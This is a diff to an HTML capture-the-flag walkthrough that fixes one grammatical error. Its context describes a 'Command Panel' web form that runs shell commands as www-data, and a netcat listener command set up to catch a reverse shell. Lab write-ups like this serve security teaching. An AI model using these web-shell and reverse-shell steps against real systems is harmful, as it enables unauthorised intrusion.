@@ -68,7 +68,7 @@
 
             <section id="Three">
                 <h2>Step Three - A Reverse Shell</h2>
-                <p>We now have a active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
+                <p>We now have an active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
                 <img src="pickle_form.png" alt="not_found.png">
                 <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is commonly the user created when the web server software is installed and therefore is, typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
                 <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
